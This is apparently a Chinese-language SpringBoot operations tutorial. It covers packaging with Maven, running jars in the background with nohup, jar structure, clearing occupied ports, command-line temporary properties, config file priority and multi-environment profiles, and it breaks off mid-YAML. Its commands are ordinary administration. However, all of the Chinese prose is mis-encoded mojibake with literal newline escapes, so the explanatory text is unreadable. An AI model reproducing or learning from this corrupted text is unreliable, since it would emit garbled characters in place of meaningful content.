èƒ½å¤ŸæŒæ¡SpringBootç¨‹åºå¤šç¯å¢ƒå¼€å‘<br/>èƒ½å¤ŸåŸºäºLinuxç³»ç»Ÿå‘å¸ƒSpringBootå·¥ç¨‹<br/>èƒ½å¤Ÿè§£å†³çº¿ä¸Šçµæ´»é…ç½®SpringBootå·¥ç¨‹çš„éœ€æ±‚ |\n\n# è¿ç»´å®ç”¨ç¯‡\n\n## 1.æ‰“åŒ…ä¸è¿è¡Œ\n\n### â‘ ç¨‹åºæ‰“åŒ…\n\nSpringBootç¨‹åºæ˜¯åŸºäºMavenåˆ›å»ºçš„ï¼Œåœ¨Mavenä¸­æä¾›æœ‰æ‰“åŒ…çš„æŒ‡ä»¤ï¼Œå«åšpackageã€‚\n\n```java\nmvn package\n```\n\næœ¬æ“ä½œä¹Ÿå¯ä»¥åœ¨IDEAç¯å¢ƒä¸‹æ‰§è¡Œã€‚æ‰“åŒ…åä¼šäº§ç”Ÿä¸€ä¸ªä¸å·¥ç¨‹åç±»ä¼¼çš„jaræ–‡ä»¶ï¼Œå…¶åç§°æ˜¯ç”±`æ¨¡å—å+ç‰ˆæœ¬å·+.jar`ç»„æˆçš„ã€‚å¦‚æœä½ å†™çš„æµ‹è¯•ç±»ä¸­æœ‰æ“ä½œæ•°æ®åº“çš„åŠŸèƒ½ï¼Œæ‰“åŒ…æ—¶å¯ä»¥åœ¨IDEA->Mavenä¸­ç‚¹å‡»è·³è¿‡æµ‹è¯•æŒ‰é’®ï¼Œå†æ‰“åŒ…ï¼Œæ¥é¿å…æµ‹è¯•ç±»å½±å“æ•°æ®åº“ã€‚\n\n<font color=\"#ff0000\"><b>ç‰¹åˆ«å…³æ³¨</b></font>ï¼šåœ¨ä½¿ç”¨å‘å¯¼åˆ›å»ºSpringBootå·¥ç¨‹æ—¶ï¼Œpom.xmlæ–‡ä»¶ä¸­ä¼šæœ‰å¦‚ä¸‹é…ç½®ï¼Œè¿™ä¸€æ®µé…ç½®åƒä¸‡ä¸èƒ½åˆ é™¤ï¼Œå¦åˆ™æ‰“åŒ…åæ— æ³•æ­£å¸¸æ‰§è¡Œç¨‹åºã€‚\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-maven-plugin</artifactId>\n        </plugin>\n    </plugins>\n</build>\n```\n\n###  â‘¡ç¨‹åºè¿è¡Œ\n\n- 1.å®‰è£…JDKï¼Œä¸”ç‰ˆæœ¬ä¸ä½äºæ‰“åŒ…æ—¶ä½¿ç”¨çš„JDKç‰ˆæœ¬\n\n- 2.ç¨‹åºåŒ…ä¿å­˜åœ¨/usr/local/è‡ªå®šä¹‰ç›®å½•ä¸­æˆ–$HOMEä¸‹\n\n- 3.æ‰§è¡Œè¿è¡ŒæŒ‡ä»¤å°±å¯ä»¥äº†\n\nå‰å°è¿è¡Œ\n\n```bash\njava -jar å·¥ç¨‹åŒ…å.jar\n```\n\nåå°è¿è¡Œ\n\n```bash\n$ nohup java -jar å·¥ç¨‹åŒ…å.jar > server.log 2>&1 &\n\n#å‘½ä»¤è§£é‡Š\n# nohup è‹±æ–‡å…¨ç§° no hang upï¼ˆä¸æŒ‚èµ·ï¼‰ï¼Œç”¨äºåœ¨ç³»ç»Ÿåå°ä¸æŒ‚æ–­åœ°è¿è¡Œå‘½ä»¤ï¼Œé€€å‡ºç»ˆç«¯ä¸ä¼šå½±å“ç¨‹åºçš„è¿è¡Œ\n# æœ€åä¸€ä¸ª&è¡¨ç¤ºæŠŠæ¡å‘½ä»¤æ”¾åˆ°åå°æ‰§è¡Œ\n# 2>&1è¡¨ç¤ºæŠŠæ ‡å‡†é”™è¯¯è¾“å‡ºå’Œæ ‡å‡†è¾“å‡ºéƒ½å®šå‘åˆ°logä¸­\n```\n\n| åç§°                 | ä»£ç  | æ“ä½œç¬¦           | Javaä¸­è¡¨ç¤º |\n| :------------------- | :--- | :--------------- | :--------- |\n| æ ‡å‡†è¾“å…¥(stdin)      | 0    | < æˆ– <<          | System.in  |\n| æ ‡å‡†è¾“å‡º(stdout)     | 1    | >, >>, 1> æˆ– 1>> | System.out |\n| æ ‡å‡†é”™è¯¯è¾“å‡º(stderr) | 2    | 2> æˆ– 2>>        | System.err |\n\nå‚è€ƒï¼š[æ·±å…¥ç†è§£Linux shellä¸­2>&1çš„å«ä¹‰](https://www.jb51.net/article/169778.htm)\n\n**æ€»ç»“**\n\n1. SpringBootå·¥ç¨‹å¯ä»¥åŸºäºjavaç¯å¢ƒä¸‹ç‹¬ç«‹è¿è¡Œjaræ–‡ä»¶å¯åŠ¨æœåŠ¡\n2. SpringBootå·¥ç¨‹æ‰§è¡Œmvnå‘½ä»¤packageè¿›è¡Œæ‰“åŒ…\n3. æ‰§è¡Œjarå‘½ä»¤ï¼šjava â€“jar å·¥ç¨‹å.jar\n\n### â‘¢jarè¿è¡Œæœºåˆ¶\n\n- jaråŒ…ç»“æ„\n\n```powershell\n$ tree -L 2\nâ”œâ”€â”€ BOOT-INF\nâ”‚Â Â  â”œâ”€â”€ classes\nâ”‚Â Â  â”œâ”€â”€ classpath.idx\nâ”‚Â Â  â”œâ”€â”€ layers.idx\nâ”‚Â Â  â””â”€â”€ lib\nâ”œâ”€â”€ META-INF\nâ”‚Â Â  â”œâ”€â”€ MANIFEST.MF\nâ”‚Â Â  â””â”€â”€ maven\nâ””â”€â”€ org\n    â””â”€â”€ springframework\n```\n\n- MANIFEST.MF æ–‡ä»¶\n\n```yaml\nManifest-Version: 1.0\nSpring-Boot-Classpath-Index: BOOT-INF/classpath.idx\nImplementation-Title: springboot_08_ssmp\nImplementation-Version: 0.0.1-SNAPSHOT\nSpring-Boot-Layers-Index: BOOT-INF/layers.idx\nStart-Class: com.jianjian.SSMPApplication\nSpring-Boot-Classes: BOOT-INF/classes/\nSpring-Boot-Lib: BOOT-INF/lib/\nBuild-Jdk-Spec: 1.8\nSpring-Boot-Version: 2.5.4\nCreated-By: Maven Jar Plugin 3.2.0\nMain-Class: org.springframework.boot.loader.JarLauncher\n```\n\n- è¿ä½œæœºåˆ¶\n\n1. `spring-boot-maven-plug`ä¼šæ‰“å‡ºä¸€ä¸ªç‰¹æ®Šçš„åŒ…ï¼ŒåŒ…å«Springæ¡†æ¶éƒ¨åˆ†åŠŸèƒ½ï¼ŒåŸå§‹å·¥ç¨‹å†…å®¹ï¼ŒåŸå§‹å·¥ç¨‹ä¾èµ–çš„jaråŒ…\n2. é¦–å…ˆè¯»å–`MANIFEST.MF`æ–‡ä»¶ä¸­çš„`Main-Class`å±æ€§ï¼Œç”¨æ¥æ ‡è®°æ‰§è¡Œjava -jarå‘½ä»¤åè¿è¡Œçš„ç±»`JarLauncher`\n3. JarLauncherç±»æ‰§è¡Œæ—¶ä¼šæ‰¾åˆ°`Start-Class`å±æ€§ï¼Œä¹Ÿå°±æ˜¯å¯åŠ¨ç±»ç±»å\n4. è¿è¡Œå¯åŠ¨ç±»æ—¶ä¼šè¿è¡Œå½“å‰å·¥ç¨‹çš„å†…å®¹\n5. è¿è¡Œå½“å‰å·¥ç¨‹æ—¶ä¼šä½¿ç”¨ä¾èµ–çš„jaråŒ…ï¼Œä»libç›®å½•ä¸­æŸ¥æ‰¾\n\n### â‘£å¼‚å¸¸æ’æŸ¥\n\nå¯åŠ¨SpringBootå·¥ç¨‹æ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°ç«¯å£å ç”¨çš„é—®é¢˜ã€‚\n\n- windowsç‰ˆ\n\n```bash\n# æŸ¥è¯¢æŒ‡å®šç«¯å£\n$ netstat -ano |findstr \"ç«¯å£å·\"\n# æ ¹æ®è¿›ç¨‹PIDæŸ¥è¯¢è¿›ç¨‹åç§°\n$ tasklist |findstr \"è¿›ç¨‹PIDå·\"\n# æ ¹æ®PIDæ€æ­»ä»»åŠ¡\n$ taskkill /F /PID \"è¿›ç¨‹PIDå·\"\n# æ ¹æ®è¿›ç¨‹åç§°æ€æ­»ä»»åŠ¡\n$ taskkill -f -t -im \"è¿›ç¨‹åç§°\"\n```\n\n- Linuxç‰ˆ\n\n```bash\n# æŸ¥è¯¢æŒ‡å®šç«¯å£\n$ ps -ef | grep \"ç«¯å£å·\"\n# æ ¹æ®è¿›ç¨‹PIDæŸ¥è¯¢è¿›ç¨‹åç§°\n$ ps -ef | grep \"è¿›ç¨‹PIDå·\"\n# æ ¹æ®PIDæ€æ­»ä»»åŠ¡\n$ kill -9 è¿›ç¨‹PIDå·\n# æ ¹æ®è¿›ç¨‹åç§°æ€æ­»ä»»åŠ¡\n$ kill -9 è¿›ç¨‹åç§°\n```\n\n## 2.é…ç½®è¿›é˜¶\n\n### â‘ ä¸´æ—¶å±æ€§\n\n> ç›®å‰æˆ‘ä»¬çš„ç¨‹åºåŒ…æ‰“å¥½äº†ï¼Œå¯ä»¥å‘å¸ƒäº†ã€‚ä½†æ˜¯ç¨‹åºåŒ…æ‰“å¥½ä»¥åï¼Œé‡Œé¢çš„é…ç½®éƒ½å·²ç»æ˜¯å›ºå®šçš„äº†ï¼Œæ¯”å¦‚é…ç½®äº†æœåŠ¡å™¨çš„ç«¯å£æ˜¯8080ã€‚å¦‚æœæˆ‘è¦å¯åŠ¨é¡¹ç›®ï¼Œå‘ç°å½“å‰æˆ‘çš„æœåŠ¡å™¨ä¸Šå·²ç»æœ‰åº”ç”¨å¯åŠ¨èµ·æ¥å¹¶ä¸”å ç”¨äº†8080ç«¯å£ï¼Œè¿™ä¸ªæ—¶å€™å°±å°´å°¬äº†ã€‚éš¾é“è¦é‡æ–°æŠŠæ‰“åŒ…å¥½çš„ç¨‹åºä¿®æ”¹ä¸€ä¸‹å—ï¼Ÿæ¯”å¦‚æˆ‘è¦æŠŠæ‰“åŒ…å¥½çš„ç¨‹åºå¯åŠ¨ç«¯å£æ”¹æˆ80ã€‚\n\n#### a.æœåŠ¡å™¨ä¸­ä½¿ç”¨ä¸´æ—¶å±æ€§\n\nSpringBootæä¾›äº†çµæ´»çš„é…ç½®æ–¹å¼ï¼Œå¦‚æœä½ å‘ç°ä½ çš„é¡¹ç›®ä¸­æœ‰ä¸ªåˆ«å±æ€§éœ€è¦é‡æ–°é…ç½®ï¼Œå¯ä»¥ä½¿ç”¨ä¸´æ—¶å±æ€§çš„æ–¹å¼å¿«é€Ÿä¿®æ”¹æŸäº›é…ç½®ã€‚æ–¹æ³•ä¹Ÿç‰¹åˆ«ç®€å•ï¼Œåœ¨å¯åŠ¨çš„æ—¶å€™æ·»åŠ ä¸Šå¯¹åº”å‚æ•°å°±å¯ä»¥äº†ã€‚\n\n```bash\n$ java â€“jar springboot.jar â€“-server.port=80\n```\n\nå¦‚æœä½ å‘ç°è¦ä¿®æ”¹çš„å±æ€§ä¸æ­¢ä¸€ä¸ªï¼Œå¯ä»¥æŒ‰ç…§ä¸Šè¿°æ ¼å¼ç»§ç»­å†™ï¼Œå±æ€§ä¸å±æ€§ä¹‹é—´ä½¿ç”¨ç©ºæ ¼åˆ†éš”ã€‚\n\n```bash\n$ java â€“jar springboot.jar â€“-server.port=80 --logging.level.root=debug\n```\n\n#### b.å¼€å‘ç¯å¢ƒä¸­ä½¿ç”¨ä¸´æ—¶å±æ€§\n\næ‰“å¼€SpringBootå¼•å¯¼ç±»çš„è¿è¡Œç•Œé¢ï¼Œåœ¨é‡Œé¢æ‰¾åˆ°é…ç½®é¡¹ã€‚å…¶ä¸­Program argumentså¯¹åº”çš„ä½ç½®å°±æ˜¯æ·»åŠ ä¸´æ—¶å±æ€§çš„ï¼Œå¯ä»¥åŠ å‡ ä¸ªè¯•è¯•æ•ˆæœã€‚\n\n![](https://img.jwt1399.top/img/202209131300448.png)\n\nåšåˆ°è¿™é‡Œå…¶å®å¯ä»¥äº§ç”Ÿä¸€ä¸ªæ€è€ƒäº†ï¼Œå¦‚æœå¯¹javaç¼–ç¨‹ç†Ÿæ‚‰çš„å°ä¼™ä¼´åº”è¯¥çŸ¥é“ï¼Œæˆ‘ä»¬è¿è¡Œmainæ–¹æ³•çš„æ—¶å€™ï¼Œå¦‚æœæƒ³ä½¿ç”¨mainæ–¹æ³•çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢çš„argså‚æ•°ï¼Œå°±æ˜¯åœ¨ä¸Šé¢è¿™ä¸ªä½ç½®æ·»åŠ çš„å‚æ•°ã€‚\n\n```java\npublic static void main(String[] args) {\n}\n```\n\nåŸæ¥æ˜¯è¿™æ ·ï¼Œé€šè¿‡è¿™ä¸ªargså°±å¯ä»¥è·å–åˆ°å‚æ•°ã€‚å†æ¥çœ‹æˆ‘ä»¬çš„å¼•å¯¼ç±»æ˜¯å¦‚ä½•ä¹¦å†™çš„\n\n```java\npublic static void main(String[] args) {\n    SpringApplication.run(SSMPApplication.class,args);\n}\n```\n\nè¿™ä¸ªargså‚æ•°å±…ç„¶ä¼ é€’ç»™äº†runæ–¹æ³•ï¼Œçœ‹æ¥åœ¨Ideaä¸­é…ç½®çš„ä¸´æ—¶å‚æ•°å°±æ˜¯é€šè¿‡è¿™ä¸ªä½ç½®ä¼ é€’åˆ°æˆ‘ä»¬çš„ç¨‹åºä¸­çš„ã€‚è¨€å¤–ä¹‹æ„ï¼Œè¿™é‡Œå¦‚æœä¸ç”¨è¿™ä¸ªargsæ˜¯ä¸æ˜¯å°±æ–­å¼€äº†å¤–éƒ¨ä¼ é€’ä¸´æ—¶å±æ€§çš„å…¥å£å‘¢ï¼Ÿæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„è°ƒç”¨æ–¹å¼ï¼Œè¿™æ ·å¤–éƒ¨ä¸´æ—¶å±æ€§å°±æ— æ³•è¿›å…¥åˆ°SpringBootç¨‹åºä¸­äº†ã€‚\n\n```java\npublic static void main(String[] args) {\n    SpringApplication.run(SSMPApplication.class);\n}\n```\n\næˆ–è€…è¿˜å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ ¼å¼æ¥ç©è¿™ä¸ªæ“ä½œï¼Œå°±æ˜¯å°†é…ç½®ä¸å†™åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œç›´æ¥å†™æˆä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œä¼ é€’ç»™ç¨‹åºå…¥å£ã€‚å½“ç„¶ï¼Œè¿™ç§åšæ³•å¹¶æ²¡æœ‰ä»€ä¹ˆå®é™…å¼€å‘æ„ä¹‰ã€‚\n\n```java\npublic static void main(String[] args) {\n    String[] arg = new String[1];\n    arg[0] = \"--server.port=8082\";\n    SpringApplication.run(SSMPApplication.class, arg);\n}\n```\n\n### â‘¡**å±æ€§åŠ è½½ä¼˜å…ˆçº§**\n\nç°åœ¨æˆ‘ä»¬çš„ç¨‹åºé…ç½®å—ä¸¤ä¸ªåœ°æ–¹æ§åˆ¶äº†ï¼Œç¬¬ä¸€é…ç½®æ–‡ä»¶ï¼Œç¬¬äºŒä¸´æ—¶å±æ€§ã€‚å¹¶ä¸”æˆ‘ä»¬å‘ç°ä¸´æ—¶å±æ€§çš„åŠ è½½ä¼˜å…ˆçº§è¦é«˜äºé…ç½®æ–‡ä»¶çš„ã€‚é‚£æ˜¯å¦è¿˜æœ‰å…¶ä»–çš„é…ç½®æ–¹å¼å‘¢ï¼Ÿæœ‰çš„\n\næ‰“å¼€å®˜æ–¹æ–‡æ¡£ä¸­å¯¹åº”çš„å†…å®¹ï¼Œå°±å¯ä»¥æŸ¥çœ‹é…ç½®è¯»å–çš„ä¼˜å…ˆé¡ºåºã€‚åœ°å€ï¼š[å±æ€§åŠ è½½ä¼˜å…ˆçº§ (spring.io)](https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config)\n\n![](https://img.jwt1399.top/img/202209111913476.png)\n\næœ‰14ç§é…ç½®çš„ä½ç½®ï¼Œè€Œæˆ‘ä»¬ç°åœ¨ä½¿ç”¨çš„æ˜¯è¿™é‡Œé¢çš„2ä¸ªã€‚\n\n- ç¬¬3æ¡Config dataè¯´çš„å°±æ˜¯ä½¿ç”¨é…ç½®æ–‡ä»¶ï¼Œ\n\n- ç¬¬11æ¡Command line argumentsè¯´çš„å°±æ˜¯ä½¿ç”¨å‘½ä»¤è¡Œä¸´æ—¶å‚æ•°ã€‚\n\nè¿™14ç§é…ç½®çš„é¡ºåºå°±æ˜¯SpringBootåŠ è½½é…ç½®çš„é¡ºåºï¼Œè¿™ä¸ªåˆ—è¡¨**ä¸Šé¢çš„ä¼˜å…ˆçº§ä½ï¼Œä¸‹é¢çš„ä¼˜å…ˆçº§é«˜**ã€‚\n\n**æ€»ç»“**\n\n1. ä½¿ç”¨jarå‘½ä»¤å¯åŠ¨SpringBootå·¥ç¨‹æ—¶å¯ä»¥ä½¿ç”¨ä¸´æ—¶å±æ€§æ›¿æ¢é…ç½®æ–‡ä»¶ä¸­çš„å±æ€§\n2. ä¸´æ—¶å±æ€§æ·»åŠ æ–¹å¼ï¼šjava â€“jar å·¥ç¨‹å.jar â€“-å±æ€§å=å€¼\n3. å¤šä¸ªä¸´æ—¶å±æ€§ä¹‹é—´ä½¿ç”¨ç©ºæ ¼åˆ†éš”\n4. ä¸´æ—¶å±æ€§å¿…é¡»æ˜¯å½“å‰bootå·¥ç¨‹æ”¯æŒçš„å±æ€§ï¼Œå¦åˆ™è®¾ç½®æ— æ•ˆ\n\n### â‘¢é…ç½®æ–‡ä»¶çº§åˆ«\n\nSpringBootæä¾›4ä¸ªçº§åˆ«é…ç½®æ–‡ä»¶ã€‚\n\n- 1.ç¨‹åºåŒ…æ‰€åœ¨ç›®å½•ä¸­é…ç½®æ–‡ä»¶\n- 2.ç¨‹åºåŒ…æ‰€åœ¨ç›®å½•ä¸­configç›®å½•ä¸‹é…ç½®æ–‡ä»¶\n\n- 3.ç±»è·¯å¾„ä¸‹configç›®å½•ä¸‹é…ç½®æ–‡ä»¶\n- 4.ç±»è·¯å¾„ä¸‹é…ç½®æ–‡ä»¶ï¼ˆä¸€ç›´ä½¿ç”¨çš„æ˜¯è¿™ä¸ªï¼Œä¹Ÿå°±æ˜¯resourcesç›®å½•ä¸­çš„application.ymlæ–‡ä»¶ï¼‰\n\nå…¶å®å°±æ˜¯æä¾›ç»™äº†4ç§é…ç½®æ–‡ä»¶ä¹¦å†™çš„ä½ç½®ã€‚ä¸Šé¢4ä¸ªæ–‡ä»¶çš„åŠ è½½ä¼˜å…ˆé¡ºåºä¸º\n\n- 1çº§    file ï¼šconfig/application.yml **ã€æœ€é«˜ã€‘**\n\n- 2çº§    file ï¼šapplication.yml\n\n- 3çº§    classpathï¼šconfig/application.yml\n\n- 4çº§    classpathï¼šapplication.yml  **ã€æœ€ä½ã€‘**\n\né‚£ä¸ºä»€ä¹ˆè®¾è®¡è¿™ç§å¤šç§å‘¢ï¼Ÿè¯´ä¸€ä¸ªæœ€å…¸å‹çš„åº”ç”¨å§ã€‚\n\n- åœºæ™¯Aï¼šä½ ä½œä¸ºä¸€ä¸ªå¼€å‘è€…ï¼Œä¸ºäº†æ–¹ä¾¿è‡ªå·±å†™ä»£ç ï¼Œé…ç½®çš„æ•°æ®åº“è‚¯å®šæ˜¯è¿æ¥ä½ è‡ªå·±æœ¬æœºçš„ï¼Œå’±ä»¬ä½¿ç”¨ç¬¬4çº§åˆ«ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰ä¸€ç›´ç”¨çš„application.ymlã€‚\n- åœºæ™¯Bï¼šç°åœ¨é¡¹ç›®å¼€å‘åˆ°äº†ä¸€ä¸ªé˜¶æ®µï¼Œè¦è”è°ƒæµ‹è¯•äº†ï¼Œè¿æ¥çš„æ•°æ®åº“æ˜¯æµ‹è¯•æœåŠ¡å™¨çš„æ•°æ®åº“ï¼Œè‚¯å®šè¦æ¢ä¸€ç»„é…ç½®å§ã€‚ä½ å¯ä»¥é€‰æ‹©æŠŠä½ ä¹‹å‰çš„æ–‡ä»¶ä¸­çš„å†…å®¹éƒ½æ”¹äº†ï¼Œç›®å‰è¿˜ä¸éº»çƒ¦ã€‚\n- åœºæ™¯Cï¼šæµ‹è¯•å®Œäº†ï¼Œä¸€åˆ‡OKã€‚ä½ ç»§ç»­å†™ä½ çš„ä»£ç ï¼Œä½ å‘ç°ä½ åŸæ¥å†™çš„é…ç½®æ–‡ä»¶è¢«æ”¹æˆæµ‹è¯•æœåŠ¡å™¨çš„å†…å®¹äº†ï¼Œä½ è¦å†æ”¹å›æ¥ã€‚ç°åœ¨æ˜ç™½äº†ä¸ï¼Ÿåœºæ™¯Bä¸­æŠŠä½ çš„å†…å®¹éƒ½æ”¹æ‰äº†ï¼Œä½ ç°åœ¨è¦é‡æ–°æ”¹å›æ¥ï¼Œä»¥åå‘¢ï¼Ÿæ”¹æ¥æ”¹å»å—ï¼Ÿ\n\nè§£å†³æ–¹æ¡ˆå¾ˆç®€å•ï¼Œç”¨ä¸Šé¢ç¬¬3è¿™ä¸ªçº§åˆ«çš„é…ç½®æ–‡ä»¶å°±å¯ä»¥å¿«é€Ÿè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå†å†™ä¸€ä¸ªé…ç½®å°±è¡Œäº†ã€‚ä¸¤ä¸ªé…ç½®æ–‡ä»¶å…±å­˜ï¼Œå› ä¸ºconfigç›®å½•ä¸­çš„é…ç½®åŠ è½½ä¼˜å…ˆçº§æ¯”ä½ çš„é«˜ï¼Œæ‰€ä»¥é…ç½®é¡¹å¦‚æœå’Œçº§åˆ«4é‡Œé¢çš„å†…å®¹ç›¸åŒå°±è¦†ç›–äº†ï¼Œè¿™æ ·æ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Ÿ\n\nçº§åˆ«1å’Œ2ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å‘¢ï¼Ÿç¨‹åºæ‰“åŒ…ä»¥åå°±è¦ç”¨è¿™ä¸ªçº§åˆ«äº†ï¼Œç®¡ä½ ç¨‹åºé‡Œé¢é…ç½®å†™çš„æ˜¯ä»€ä¹ˆï¼Ÿæˆ‘çš„çº§åˆ«é«˜ï¼Œå¯ä»¥è½»æ¾è¦†ç›–ä½ ï¼Œå°±ä¸ç”¨è€ƒè™‘è¿™äº›é…ç½®å†²çªçš„é—®é¢˜äº†ã€‚\n\n**æ€»ç»“**\n\n1. é…ç½®æ–‡ä»¶åˆ†ä¸º4ç§\n\n   - é¡¹ç›®ç±»è·¯å¾„é…ç½®æ–‡ä»¶ï¼šå¼€å‘äººå‘˜æœ¬æœºå¼€å‘ä¸æµ‹è¯•\n   - é¡¹ç›®ç±»è·¯å¾„configç›®å½•ä¸­é…ç½®æ–‡ä»¶ï¼šé¡¹ç›®ç»ç†æ•´ä½“è°ƒæ§\n   - å·¥ç¨‹è·¯å¾„é…ç½®æ–‡ä»¶ï¼šè¿ç»´äººå‘˜é…ç½®æ¶‰å¯†çº¿ä¸Šç¯å¢ƒ\n   - å·¥ç¨‹è·¯å¾„configç›®å½•ä¸­é…ç½®æ–‡ä»¶ï¼šè¿ç»´ç»ç†æ•´ä½“è°ƒæ§\n\n2. å¤šå±‚çº§é…ç½®æ–‡ä»¶é—´çš„å±æ€§é‡‡ç”¨å åŠ å¹¶è¦†ç›–çš„å½¢å¼ä½œç”¨äºç¨‹åº\n\n\n### â‘£è‡ªå®šä¹‰é…ç½®æ–‡ä»¶\n\nä¹‹å‰ä½¿ç”¨çš„é…ç½®æ–‡ä»¶éƒ½æ˜¯application.ymlï¼Œå…¶å®è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥æ”¹åå­—çš„ï¼Œè¿™æ ·æ–¹ä¾¿ç»´æŠ¤ã€‚æ¯”å¦‚æˆ‘2020å¹´4æœˆ1æ—¥ææ´»åŠ¨ï¼Œèµ°äº†ä¸€ç»„é…ç½®ï¼Œ2020å¹´5æœˆ1æ—¥æ´»åŠ¨å–æ¶ˆï¼Œæ¢å¤åŸå§‹é…ç½®ï¼Œè¿™ä¸ªæ—¶å€™åªéœ€è¦é‡æ–°æ›´æ¢ä¸€ä¸‹é…ç½®æ–‡ä»¶å°±å¯ä»¥äº†ã€‚ä½†æ˜¯ä½ æ€»ä¸èƒ½åœ¨åŸå§‹é…ç½®æ–‡ä»¶ä¸Šä¿®æ”¹å§ï¼Œä¸ç„¶æå®Œæ´»åŠ¨ä»¥åï¼Œæ´»åŠ¨çš„é…ç½®å°±ç•™ä¸ä¸‹æ¥äº†ï¼Œä¸åˆ©äºç»´æŠ¤ã€‚\n\nè‡ªå®šä¹‰é…ç½®æ–‡ä»¶æ–¹å¼æœ‰å¦‚ä¸‹ä¸¤ç§ï¼š\n\n- **æ–¹å¼ä¸€ï¼šä½¿ç”¨ä¸´æ—¶å±æ€§è®¾ç½®é…ç½®æ–‡ä»¶åï¼Œæ³¨æ„ä»…ä»…æ˜¯åç§°ï¼Œä¸è¦å¸¦æ‰©å±•å**\n\n```bash\n--spring.config.name=ä¸å¸¦åç¼€çš„é…ç½®æ–‡ä»¶åå­—\n```\n\n![](https://img.jwt1399.top/img/202209111933227.png)\n\n- **æ–¹å¼äºŒï¼šä½¿ç”¨ä¸´æ—¶å±æ€§è®¾ç½®é…ç½®æ–‡ä»¶è·¯å¾„ï¼Œè¿™ä¸ªæ˜¯å…¨è·¯å¾„å**\n\n```bash\n--spring.config.location=classpath:/å¸¦åç¼€çš„é…ç½®æ–‡ä»¶åå­—\n\n#ä¹Ÿå¯ä»¥è®¾ç½®åŠ è½½å¤šä¸ªé…ç½®æ–‡ä»¶\n--spring.config.location=classpath:/å¸¦åç¼€çš„é…ç½®æ–‡ä»¶åå­—,classpath:/å¸¦åç¼€çš„é…ç½®æ–‡ä»¶åå­—\n```\n\n![](https://img.jwt1399.top/img/202209111933941.png)\n\n<font color=\"#f0f\"><b>æ¸©é¦¨æç¤º</b></font>\n\nâ€‹\t\tæˆ‘ä»¬ç°åœ¨ç ”ç©¶çš„éƒ½æ˜¯SpringBootå•ä½“é¡¹ç›®ï¼Œå°±æ˜¯å•æœåŠ¡å™¨ç‰ˆæœ¬ã€‚å…¶å®ä¼ä¸šå¼€å‘ç°åœ¨æ›´å¤šçš„æ˜¯ä½¿ç”¨åŸºäºSpringCloudæŠ€æœ¯çš„å¤šæœåŠ¡å™¨é¡¹ç›®ã€‚è¿™ç§é…ç½®æ–¹å¼ä¸Šé¢çš„æ–¹å¼å®Œå…¨ä¸ä¸€æ ·ï¼Œæ‰€æœ‰çš„æœåŠ¡å™¨å°†ä¸å†è®¾ç½®è‡ªå·±çš„é…ç½®æ–‡ä»¶ï¼Œè€Œæ˜¯é€šè¿‡é…ç½®ä¸­å¿ƒè·å–é…ç½®ï¼ŒåŠ¨æ€åŠ è½½é…ç½®ä¿¡æ¯ã€‚ä¸ºä»€ä¹ˆè¿™æ ·åšï¼Ÿé›†ä¸­ç®¡ç†ã€‚\n\n**æ€»ç»“**\n\n1. é…ç½®æ–‡ä»¶å¯ä»¥ä¿®æ”¹åç§°ï¼Œé€šè¿‡å¯åŠ¨å‚æ•°è®¾å®š\n2. é…ç½®æ–‡ä»¶å¯ä»¥ä¿®æ”¹è·¯å¾„ï¼Œé€šè¿‡å¯åŠ¨å‚æ•°è®¾å®š\n3. å¾®æœåŠ¡å¼€å‘ä¸­é…ç½®æ–‡ä»¶é€šè¿‡é…ç½®ä¸­å¿ƒè¿›è¡Œè®¾ç½®\n\n##  3.å¤šç¯å¢ƒå¼€å‘\n\nç¨‹åºæœ€ç»ˆè¦æ”¾åˆ°æœåŠ¡å™¨ä¸Šå»è¿è¡Œã€‚æ¯ä¸ªè®¡ç®—æœºç¯å¢ƒä¸ä¸€æ ·ï¼Œè¿™å°±æ˜¯å¤šç¯å¢ƒã€‚å¸¸è§çš„å¤šç¯å¢ƒå¼€å‘ä¸»è¦å…¼é¡¾3ç§ç¯å¢ƒè®¾ç½®ã€‚\n\n- å¼€å‘ç¯å¢ƒâ€”â€”è‡ªå·±ç”¨çš„\n\n- æµ‹è¯•ç¯å¢ƒâ€”â€”è‡ªå·±å…¬å¸ç”¨çš„\n\n- ç”Ÿäº§ç¯å¢ƒâ€”â€”ç”²æ–¹çˆ¸çˆ¸ç”¨çš„\n\nå› ä¸ºè¿™æ˜¯ç»å¯¹ä¸åŒçš„ä¸‰å°ç”µè„‘ï¼Œæ‰€ä»¥ç¯å¢ƒè‚¯å®šæœ‰æ‰€ä¸åŒï¼Œæ¯”å¦‚è¿æ¥çš„æ•°æ®åº“ä¸ä¸€æ ·ï¼Œè®¾ç½®çš„è®¿é—®ç«¯å£ä¸ä¸€æ ·ç­‰ç­‰ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202209112043599.png\"  style=\"zoom:67%;\" />\n\n### â‘ yamlå•ä¸€æ–‡ä»¶ç‰ˆ\n\nå¤šç¯å¢ƒå¼€å‘å°±æ˜¯é’ˆå¯¹ä¸åŒçš„ç¯å¢ƒè®¾ç½®ä¸åŒçš„é…ç½®å±æ€§å³å¯ã€‚æ¯”å¦‚ä½ è‡ªå·±å¼€å‘æ—¶ï¼Œé…ç½®ä½ çš„ç«¯å£å¦‚ä¸‹ï¼š\n\n```yaml\nserver:\n  port: 80\n```\n\nå¦‚ä½•è®¾è®¡ä¸¤ç»„ç¯å¢ƒå‘¢ï¼Ÿä¸­é—´ä½¿ç”¨ä¸‰ä¸ªå‡å·åˆ†éš”å¼€\n\n```yaml\nserver:\n  port: 80\n---\nserver:\n  port: 81\n```\n\nå¦‚ä½•åŒºåˆ†ä¸¤ç§ç¯å¢ƒå‘¢ï¼Ÿèµ·åå­—å‘—\n\n```yaml\nspring:  # ç¯å¢ƒ1\n\tprofiles: pro   \nserver:\n\tport: 